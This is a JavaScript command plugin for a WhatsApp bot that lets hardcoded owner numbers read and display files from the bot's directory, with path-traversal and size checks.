const fs = require('fs').promises;
const path = require('path');

// ── STRICT OWNER NUMBERS ─────────────────────────────────────────
// Only these exact numbers can use .getfile — no exceptions.
// Paired users, admins, and other "owners" are all blocked.
const STRICT_OWNERS = ['254784747151', '254740340897', '254704320190'];

function isStrictOwner(message) {
  const jid =
    message?.key?.participant ||
    message?.key?.remoteJid ||
    message?.participant ||
    '';
  const number = jid.replace(/[^0-9]/g, '');
  return STRICT_OWNERS.some(n => number.endsWith(n) || number === n);
}

module.exports = {
  command: 'getfile',
  aliases: ['readfile', 'viewfile'],
  category: 'owner',
  description: 'Read and display file contents from bot directory',
  usage: '.getfile <filename>',
  ownerOnly: true,

  async handler(sock, message, args, context = {}) {
    const chatId = context.chatId || message.key.remoteJid;

    // ── STRICT NUMBER CHECK ───────────────────────────────────────
    if (!isStrictOwner(message)) {
      return await sock.sendMessage(chatId, {
        text: `❌ *Access Denied.*\n\nThis command is restricted to the bot owner only.`
      }, { quoted: message });
    }

    const filename = args.join(' ').trim();

    try {
      if (!filename) {
        return await sock.sendMessage(chatId, {
          text: `*📄 Get File*\n\n*Usage:*\n.getfile <filename>\n\n*Examples:*\n• .getfile index.js\n• .getfile plugins/ping.js\n• .getfile settings.js\n• .getfile package.json`
        }, { quoted: message });
      }

      // ── PATH TRAVERSAL PROTECTION ─────────────────────────────
      const botRoot = path.resolve(__dirname, '..');
      const filePath = path.resolve(botRoot, filename);

      // Block any path that escapes the bot root directory
      if (!filePath.startsWith(botRoot + path.sep) && filePath !== botRoot) {
        return await sock.sendMessage(chatId, {
          text: `❌ *Access Denied.*\n\nPath traversal is not allowed.`
        }, { quoted: message });
      }

      try {
        await fs.access(filePath);
      } catch (e) {
        return await sock.sendMessage(chatId, {
          text: `❌ *File not found!*\n\nNo file named "${filename}" exists.\n\n*Tip:* Use relative path from bot root directory.`
        }, { quoted: message });
      }

      const fileContent = await fs.readFile(filePath, 'utf8');

      if (!fileContent || fileContent.length === 0) {
        return await sock.sendMessage(chatId, {
          text: `⚠️ *File is empty*\n\nThe file "${filename}" has no content.`
        }, { quoted: message });
      }

      if (fileContent.length > 60000) {
        return await sock.sendMessage(chatId, {
          text: `❌ *File too large!*\n\nThe file "${filename}" is too large to display (${Math.round(fileContent.length / 1024)}KB).\n\n*Limit:* 60KB`
        }, { quoted: message });
      }

      const stats = await fs.stat(filePath);
      const fileSize = (stats.size / 1024).toFixed(2);
      const lastModified = stats.mtime.toLocaleString();

      const caption =
        `📄 *File: ${filename}*\n\n` +
        `📊 *Size:* ${fileSize} KB\n` +
        `📅 *Modified:* ${lastModified}\n` +
        `📝 *Lines:* ${fileContent.split('\n').length}\n\n` +
        `\`\`\`${fileContent}\`\`\``;

      await sock.sendMessage(chatId, { text: caption }, { quoted: message });

    } catch (error) {
      console.error(error);
      await sock.sendMessage(chatId, {
        text: `❌ *ᴇʀʀᴏʀ reading file*\n\n*ᴇʀʀᴏʀ:* ${error.message}`
      }, { quoted: message });
    }
  }
};
